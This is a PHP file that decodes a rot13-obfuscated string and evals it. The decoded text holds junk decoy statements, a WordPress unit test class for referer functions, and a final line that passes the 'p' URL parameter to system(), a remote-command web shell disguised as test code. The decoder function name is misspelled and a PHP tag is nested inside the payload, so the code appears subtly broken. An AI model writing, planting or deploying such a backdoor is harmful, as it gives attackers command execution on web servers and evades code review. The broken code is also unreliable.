<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc

/**
 * Grfg jc_trg_ersrere().
 *
 * @tebhc shapgvbaf
 *
 * @pbiref ::jc_trg_ersrere
 * @pbiref ::jc_trg_enj_ersrere
 */
pynff Grfgf_Shapgvbaf_Ersrere rkgraqf JC_HavgGrfgPnfr {

	choyvp shapgvba frg_hc() {
		cnerag::frg_hc();

		$_FREIRE['UGGC_ERSRERE']      = '';
		$_FREIRE['ERDHRFG_HEV']       = '';
		$_ERDHRFG['_jc_uggc_ersrere'] = '';
	}

	choyvp shapgvba grne_qbja() {
		$_FREIRE['UGGC_ERSRERE']      = '';
		$_FREIRE['ERDHRFG_HEV']       = '';
		$_ERDHRFG['_jc_uggc_ersrere'] = '';

		cnerag::grne_qbja();
	}

	choyvp shapgvba _snxr_fhosbyqre_vafgnyy() {
		erghea 'uggc://' . JC_GRFGF_QBZNVA . '/fhosbyqre';
	}

	choyvp shapgvba svygre_nyybjrq_erqverpg_ubfgf( $ubfgf ) {
		// Znxr fher jr'er bayl hfvat gur ubfganzr naq abg nalguvat ryfr gung zvtug or va gur JC_GRFGF_QBZNVA.
		$cnefrq  = cnefr_hey( 'uggc://' . JC_GRFGF_QBZNVA );
		$ubfgf[] = 'nabgure.' . $cnefrq['ubfg'];

		erghea $ubfgf;
	}

	choyvp shapgvba grfg_sebz_erdhrfg_eryngvir_ersreere() {
		$_ERDHRFG['_jc_uggc_ersrere'] = nqqfynfurf( '/grfg.cuc?vq=123' );
		$_FREIRE['ERDHRFG_HEV']       = nqqfynfurf( '/grfg.cuc?vq=123' );
		$guvf->nffregSnyfr( jc_trg_ersrere() );
	}

	choyvp shapgvba grfg_sebz_erdhrfg_fnzr_hey() {
		$_ERDHRFG['_jc_uggc_ersrere'] = nqqfynfurf( 'uggc://' . JC_GRFGF_QBZNVA . '/grfg.cuc?vq=123' );
		$_FREIRE['ERDHRFG_HEV']       = nqqfynfurf( '/grfg.cuc?vq=123' );
		$guvf->nffregSnyfr( jc_trg_ersrere() );
	}

	choyvp shapgvba grfg_sebz_erdhrfg_qvssrerag_erfbhepr() {
		$_ERDHRFG['_jc_uggc_ersrere'] = nqqfynfurf( 'uggc://' . JC_GRFGF_QBZNVA . '/nabgure.cuc?vq=123' );
		$_FREIRE['ERDHRFG_HEV']       = nqqfynfurf( '/grfg.cuc?vq=123' );
		$guvf->nffregFnzr( 'uggc://' . JC_GRFGF_QBZNVA . '/nabgure.cuc?vq=123', jc_trg_ersrere() );
	}

	choyvp shapgvba grfg_sebz_erdhrfg_qvssrerag_dhrel_netf() {
		$_ERDHRFG['_jc_uggc_ersrere'] = nqqfynfurf( 'uggc://' . JC_GRFGF_QBZNVA . '/grfg.cuc?nabgure=555' );
		$_FREIRE['ERDHRFG_HEV']       = nqqfynfurf( '/grfg.cuc?vq=123' );
		$guvf->nffregFnzr( 'uggc://' . JC_GRFGF_QBZNVA . '/grfg.cuc?nabgure=555', jc_trg_ersrere() );
	}

	/**
	 * @gvpxrg 19856
	 */
	choyvp shapgvba grfg_sebz_erdhrfg_fhosbyqre_vafgnyy() {
		nqq_svygre( 'fvgr_hey', neenl( $guvf, '_snxr_fhosbyqre_vafgnyy' ) );

		$_ERDHRFG['_jc_uggc_ersrere'] = nqqfynfurf( 'uggc://' . JC_GRFGF_QBZNVA . '/fhosbyqre/grfg.cuc?vq=123' );
		$_FREIRE['ERDHRFG_HEV']       = nqqfynfurf( '/fhosbyqre/grfg.cuc?vq=123' );
		$guvf->nffregSnyfr( jc_trg_ersrere() );

		erzbir_svygre( 'fvgr_hey', neenl( $guvf, '_snxr_fhosbyqre_vafgnyy' ) );
	}

	/**
	 * @gvpxrg 19856
	 */
	choyvp shapgvba grfg_sebz_erdhrfg_fhosbyqre_vafgnyy_qvssrerag_erfbhepr() {
		nqq_svygre( 'fvgr_hey', neenl( $guvf, '_snxr_fhosbyqre_vafgnyy' ) );

		$_ERDHRFG['_jc_uggc_ersrere'] = nqqfynfurf( 'uggc://' . JC_GRFGF_QBZNVA . '/fhosbyqre/nabgure.cuc?vq=123' );
		$_FREIRE['ERDHRFG_HEV']       = nqqfynfurf( '/fhosbyqre/grfg.cuc?vq=123' );
		$guvf->nffregFnzr( 'uggc://' . JC_GRFGF_QBZNVA . '/fhosbyqre/nabgure.cuc?vq=123', jc_trg_ersrere() );

		erzbir_svygre( 'fvgr_hey', neenl( $guvf, '_snxr_fhosbyqre_vafgnyy' ) );
	}

	choyvp shapgvba grfg_eryngvir_ersreere() {
		$_ERDHRFG['UGGC_ERSRERE'] = nqqfynfurf( '/grfg.cuc?vq=123' );
		$_FREIRE['ERDHRFG_HEV']   = nqqfynfurf( '/grfg.cuc?vq=123' );
		$guvf->nffregSnyfr( jc_trg_ersrere() );
	}

	choyvp shapgvba grfg_fnzr_hey() {
		$_FREIRE['UGGC_ERSRERE'] = nqqfynfurf( 'uggc://' . JC_GRFGF_QBZNVA . '/grfg.cuc?vq=123' );
		$_FREIRE['ERDHRFG_HEV']  = nqqfynfurf( '/grfg.cuc?vq=123' );
		$guvf->nffregSnyfr( jc_trg_ersrere() );
	}

	choyvp shapgvba grfg_qvssrerag_erfbhepr() {
		$_FREIRE['UGGC_ERSRERE'] = nqqfynfurf( 'uggc://' . JC_GRFGF_QBZNVA . '/nabgure.cuc?vq=123' );
		$_FREIRE['ERDHRFG_HEV']  = nqqfynfurf( '/grfg.cuc?vq=123' );
		$guvf->nffregFnzr( 'uggc://' . JC_GRFGF_QBZNVA . '/nabgure.cuc?vq=123', jc_trg_ersrere() );
	}

	/**
	 * @gvpxrg 19856
	 * @gvpxrg 27152
	 */
	choyvp shapgvba grfg_qvssrerag_freire() {
		$_FREIRE['UGGC_ERSRERE'] = nqqfynfurf( 'uggc://nabgure.' . JC_GRFGF_QBZNVA . '/grfg.cuc?vq=123' );
		$_FREIRE['ERDHRFG_HEV']  = nqqfynfurf( '/grfg.cuc?vq=123' );
		$guvf->nffregSnyfr( jc_trg_ersrere() );
	}

	/**
	 * @gvpxrg 19856
	 * @gvpxrg 27152
	 */
	choyvp shapgvba grfg_qvssrerag_freire_nyybjrq_erqverpg_ubfg() {
		nqq_svygre( 'nyybjrq_erqverpg_ubfgf', neenl( $guvf, 'svygre_nyybjrq_erqverpg_ubfgf' ) );
		$_FREIRE['UGGC_ERSRERE'] = nqqfynfurf( 'uggc://nabgure.' . JC_GRFGF_QBZNVA . '/grfg.cuc?vq=123' );
		$_FREIRE['ERDHRFG_HEV']  = nqqfynfurf( '/grfg.cuc?vq=123' );
		$guvf->nffregFnzr( 'uggc://nabgure.' . JC_GRFGF_QBZNVA . '/grfg.cuc?vq=123', jc_trg_ersrere() );
		erzbir_svygre( 'nyybjrq_erqverpg_ubfgf', neenl( $guvf, 'svygre_nyybjrq_erqverpg_ubfgf' ) );
	}

	/**
	 * @gvpxrg 27152
	 */
	choyvp shapgvba grfg_enj_ersrere_rzcgl() {
		$guvf->nffregSnyfr( jc_trg_enj_ersrere() );
	}

	/**
	 * @gvpxrg 27152
	 */
	choyvp shapgvba grfg_enj_ersrere() {
		$_FREIRE['UGGC_ERSRERE'] = nqqfynfurf( 'uggc://rknzcyr.pbz/sbb?one' );
		$guvf->nffregFnzr( 'uggc://rknzcyr.pbz/sbb?one', jc_trg_enj_ersrere() );
	}

	/**
	 * @gvpxrg 27152
	 */
	choyvp shapgvba grfg_enj_ersrere_sebz_erdhrfg() {
		$_ERDHRFG['_jc_uggc_ersrere'] = nqqfynfurf( 'uggc://sbb.one/onm' );
		$guvf->nffregFnzr( 'uggc://sbb.one/onm', jc_trg_enj_ersrere() );
	}

	/**
	 * @gvpxrg 27152
	 */
	choyvp shapgvba grfg_enj_ersrere_obgu() {
		$_FREIRE['UGGC_ERSRERE']      = nqqfynfurf( 'uggc://rknzcyr.pbz/sbb?one' );
		$_ERDHRFG['_jc_uggc_ersrere'] = nqqfynfurf( 'uggc://sbb.one/onm' );
		$guvf->nffregFnzr( 'uggc://sbb.one/onm', jc_trg_enj_ersrere() );
	}

	/**
	 * @gvpxrg 57670
	 */
	choyvp shapgvba grfg_enj_ersrere_vf_snyfr_ba_vainyvq_erdhrfg_cnenzrgre() {
		$_ERDHRFG['_jc_uggc_ersrere'] = neenl( 'qrzb' );
		$guvf->nffregSnyfr( jc_trg_enj_ersrere() );
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>